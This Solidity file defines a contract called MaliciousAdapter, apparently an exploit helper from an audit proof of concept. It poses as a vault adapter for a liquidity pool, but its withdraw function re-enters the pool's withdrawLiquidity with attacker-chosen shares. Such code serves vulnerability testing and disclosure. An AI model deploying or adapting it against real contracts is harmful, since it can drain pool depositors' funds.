
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface ICatPool {
    function withdrawLiquidity(uint256 shareAmount) external;
}
contract MaliciousAdapter {
    ICatPool catPool;
    IERC20 public asset;
    uint256 sharesToBurn;
    constructor(address _catPool, address _asset) {
        catPool = ICatPool(_catPool);
        asset = IERC20(_asset);
    }
    function setWithdrawArgs(uint256 _shares) external {
        sharesToBurn = _shares;
    }
    function deposit(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
    }
    function withdraw(uint256, address) external returns (uint256) {
        catPool.withdrawLiquidity(sharesToBurn);
        return 0;
    }
    function getCurrentValueHeld() external view returns (uint256) { return asset.balanceOf(address(this)); }
}
